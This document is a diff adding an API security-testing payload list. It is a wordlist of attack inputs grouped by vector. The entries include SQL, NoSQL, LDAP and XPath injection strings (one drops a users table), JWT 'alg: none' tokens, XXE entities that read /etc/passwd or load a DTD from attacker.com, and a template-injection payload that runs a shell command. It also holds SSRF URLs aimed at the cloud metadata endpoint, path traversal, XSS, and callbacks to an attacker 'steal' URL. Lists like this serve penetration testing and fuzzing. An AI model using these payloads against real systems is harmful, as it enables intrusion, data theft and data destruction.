@@ -1,0 +1,244 @@
+# Comprehensive API testing payloads for various attack vectors
+
+# JSON Injection Payloads
+{"admin": true}
+{"isAdmin": true}
+{"role": "admin"}
+{"role": "administrator"}
+{"permissions": ["admin", "read", "write", "delete"]}
+{"user_id": 1}
+{"user_id": "1"}
+{"user_id": 0}
+{"account_type": "premium"}
+{"account_type": "admin"}
+{"level": 99}
+{"privilege": "admin"}
+{"access_level": "full"}
+{"is_superuser": true}
+{"group": "administrators"}
+
+# JWT Manipulation
+{"alg": "none"}
+{"typ": "JWT", "alg": "none"}
+{"alg": "HS256", "typ": "JWT"}
+{"iss": "attacker.com"}
+{"sub": "admin"}
+{"aud": "app"}
+{"exp": 9999999999}
+{"iat": 0}
+{"nbf": 0}
+
+# NoSQL Injection (MongoDB)
+{"$ne": null}
+{"$ne": ""}
+{"$regex": ".*"}
+{"$where": "1==1"}
+{"$gt": ""}
+{"$lt": ""}
+{"$nin": []}
+{"$in": []}
+{"$exists": true}
+{"$exists": false}
+
+# GraphQL Injection
+{ __schema { types { name } } }
+{ __type(name: "User") { fields { name type { name } } } }
+query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } directives { name description locations args { ...InputValue } } } }
+query { users(limit: 999999) { id name email password } }
+mutation { deleteAllUsers }
+
+# LDAP Injection
+*)(uid=*))(|(uid=*
+*)(|(password=*)
+*)(|(cn=*)
+admin)(&(password=*))
+admin)(&(objectClass=*))
+*)(mail=*))%00
+
+# XPath Injection
+' or '1'='1
+' or 'x'='x
+' or 1=1 or ''='
+'or string-length(name(.))<10 or'
+'or contains(name,'adm') or'
+'or starts-with(name(),'adm') or'
+
+# XML Injection & XXE
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/evil.dtd">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><foo></foo>
+
+# SOAP Injection
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Header/><soapenv:Body><test><![CDATA[<script>alert('XSS')</script>]]></test></soapenv:Body></soapenv:Envelope>
+
+# Command Injection in JSON
+{"command": "ls -la"}
+{"cmd": "whoami"}
+{"exec": "id"}
+{"system": "uname -a"}
+{"shell": "/bin/bash"}
+{"run": "cat /etc/passwd"}
+
+# Path Traversal in API
+{"file": "../../../etc/passwd"}
+{"path": "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"}
+{"filename": "....//....//....//etc/passwd"}
+{"document": "..%2f..%2f..%2fetc%2fpasswd"}
+
+# Template Injection in JSON
+{"template": "{{7*7}}"}
+{"content": "${7*7}"}
+{"message": "{{config.items()}}"}
+{"text": "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}"}
+
+# Rate Limiting Bypass Headers
+X-Originating-IP: 127.0.0.1
+X-Forwarded-For: 127.0.0.1
+X-Remote-IP: 127.0.0.1
+X-Remote-Addr: 127.0.0.1
+X-Client-IP: 127.0.0.1
+X-Real-IP: 127.0.0.1
+X-Cluster-Client-IP: 127.0.0.1
+
+# HTTP Parameter Pollution
+param=value1&param=value2
+param[]=value1&param[]=value2
+param.0=value1&param.1=value2
+
+# Mass Assignment
+{"id": 1}
+{"created_at": "2023-01-01"}
+{"updated_at": "2023-01-01"}
+{"is_deleted": false}
+{"status": "active"}
+{"verified": true}
+
+# IDOR (Insecure Direct Object Reference)
+{"user_id": 1}
+{"user_id": 999999}
+{"account_id": 1}
+{"document_id": 1}
+{"file_id": 1}
+{"order_id": 1}
+
+# Business Logic Bypass
+{"price": -1}
+{"quantity": -1}
+{"discount": 100}
+{"amount": 0}
+{"total": 0.01}
+{"cost": 0}
+
+# Authentication Bypass
+{"password": ""}
+{"token": ""}
+{"session": ""}
+{"auth": false}
+{"authenticated": false}
+{"login": true}
+
+# Authorization Bypass
+{"admin": true}
+{"role": "admin"}
+{"permissions": "all"}
+{"access": "full"}
+{"level": "admin"}
+{"group": "admins"}
+
+# Time-based Attacks
+{"sleep": 5}
+{"delay": "5"}
+{"timeout": 30}
+{"wait": "5s"}
+
+# File Upload Bypass
+{"filename": "test.php"}
+{"content-type": "image/jpeg"}
+{"extension": ".jpg"}
+{"mime": "image/png"}
+{"type": "image"}
+
+# SQL Injection in JSON
+{"id": "1' OR '1'='1"}
+{"name": "admin'; DROP TABLE users; --"}
+{"email": "test@test.com' UNION SELECT password FROM users --"}
+{"search": "' OR 1=1 --"}
+
+# Cross-Site Scripting (XSS) in JSON
+{"message": "<script>alert('XSS')</script>"}
+{"comment": "<img src=x onerror=alert('XSS')>"}
+{"name": "<svg onload=alert('XSS')>"}
+{"title": "javascript:alert('XSS')"}
+
+# Server-Side Request Forgery (SSRF)
+{"url": "http://localhost:22"}
+{"callback": "http://169.254.169.254/latest/meta-data/"}
+{"webhook": "http://localhost:6379/"}
+{"redirect": "file:///etc/passwd"}
+
+# Deserialization Attacks
+{"data": "rO0ABXNyABNqYXZhLnV0aWwuQXJyYXlMaXN0eIHSHZnHYZ0DAAFJAARzaXpleHAAAAABdAAEcHduZA=="}
+{"object": "O:8:\"stdClass\":1:{s:4:\"test\";s:4:\"test\";}"}
+
+# Protocol Confusion
+{"scheme": "file://"}
+{"protocol": "gopher://"}
+{"url": "dict://localhost:11211/"}
+{"uri": "ldap://localhost:389/"}
+
+# Cache Poisoning
+{"cache-control": "no-cache"}
+{"pragma": "no-cache"}
+{"expires": "0"}
+{"etag": "\"evil\""}
+
+# Header Injection
+{"user-agent": "Mozilla/5.0\r\nX-Injected: true"}
+{"referer": "http://example.com\r\nX-Injected: true"}
+{"host": "example.com\r\nX-Injected: true"}
+
+# Response Manipulation
+{"redirect": "http://attacker.com"}
+{"location": "http://evil.com"}
+{"callback": "http://attacker.com/steal"}
+{"jsonp": "alert('XSS')"}
+
+# WebSocket Injection
+{"type": "message", "data": "<script>alert('XSS')</script>"}
+{"command": "execute", "payload": "ls -la"}
+{"action": "admin", "token": "bypassed"}
+
+# API Versioning Bypass
+{"version": "1.0"}
+{"api_version": "v1"}
+{"v": "2"}
+{"ver": "latest"}
+
+# Content-Type Bypass
+{"data": "<?xml version='1.0'?><root>test</root>"}
+{"payload": "text/html; <script>alert('XSS')</script>"}
+
+# Null Byte Injection
+{"filename": "test.txt\x00.php"}
+{"path": "/safe/path\x00../../../etc/passwd"}
+
+# Unicode Bypass
+{"input": "\u003cscript\u003ealert('XSS')\u003c/script\u003e"}
+{"name": "\u0022\u003e\u003cscript\u003ealert('XSS')\u003c/script\u003e"}
+
+# Double Encoding
+{"param": "%253Cscript%253Ealert('XSS')%253C/script%253E"}
+{"value": "%2527%2520OR%25201%253D1--"}
+
+# Blind Injection Markers
+{"id": "1'; WAITFOR DELAY '00:00:05'--"}
+{"name": "test'; SELECT SLEEP(5)--"}
+{"email": "test@test.com'; IF(1=1) WAITFOR DELAY '00:00:05'--"}
+
+# Logic Bomb Tests
+{"quantity": 999999999}
+{"size": 2147483647}
+{"length": -1}
+{"count": 0}
+{"limit": 999999999}
+{"max": 2147483647}
